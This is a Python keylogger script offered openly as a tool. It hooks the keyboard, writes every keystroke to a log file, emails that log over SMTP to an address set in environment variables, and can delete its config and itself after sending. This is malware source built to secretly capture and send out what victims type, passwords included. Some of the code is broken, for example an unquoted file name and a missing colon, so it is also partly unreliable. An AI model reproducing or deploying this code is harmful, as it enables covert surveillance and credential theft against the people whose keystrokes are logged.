#!/usr/bin/env python3
import pyHook, pythoncom, sys, logging, platform, smtplib
from datetime import datetime
from threading import Timer
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
from dotenv import load_dotenv
import os

load_dotenv()

#getting system name
name = platform.node()

def setTime(offset):
    x=datetime.today()
    #set time that you want script to send you keylog file
    y=x.replace(day=x.day+offset, hour=os.getenv("HOUR"), minute=os.getenv("MINUTE"), second=os.getenv("SECOND"), microsecond=os.getenv("MICROSECOND"))
    delta_t=y-x
    return delta_t

secs=setTime(0).seconds+1

def sendEmail():
    fromaddr = os.getenv("SENDING_EMAIL")
    toaddr = os.getenv("RECEIVING_EMAIL")
 
    msg = MIMEMultipart()

    msg['From'] = fromaddr
    msg['To'] = toaddr
    msg['Subject'] = "Keylogger"
 
    body = "Keylog for "+name
 
    msg.attach(MIMEText(body, 'plain'))
 
    filename = "klog.txt"
    attachment = open("klog.txt", "rb")
 
    part = MIMEBase('application', 'octet-stream')
    part.set_payload((attachment).read())
    encoders.encode_base64(part)
    part.add_header('Content-Disposition', "attachment; filename= %s" % filename)
 
    msg.attach(part)
 
    #here using gmail credentials but can replaced for any email provider details
    server = smtplib.SMTP(os.getenv("SERVER"), os.getenv("PORT"))
    server.starttls()
    server.login(fromaddr, os.getenv("SENDING_EMAIL_PASSWORD"))
    text = msg.as_string()
    server.sendmail(fromaddr, toaddr, text)
    server.quit()
    if os.getenv("DELETE") == True:
        os.remove(.env)
        os.remove(sys.argv[0])
    else
        setTime(1)

t = Timer(secs, sendEmail)
t.start()

file_log = 'klog.txt'

def OnKeyboardEvent(event):
    logging.basicConfig(filename=file_log, level=logging.DEBUG,format='%(message)s')
    chr(event.Ascii)
    logging.log(10,chr(event.Ascii))
    return True

hooks_manager = pyHook.HookManager()
hooks_manager.KeyDown = OnKeyboardEvent
hooks_manager.HookKeyboard()
pythoncom.PumpMessages()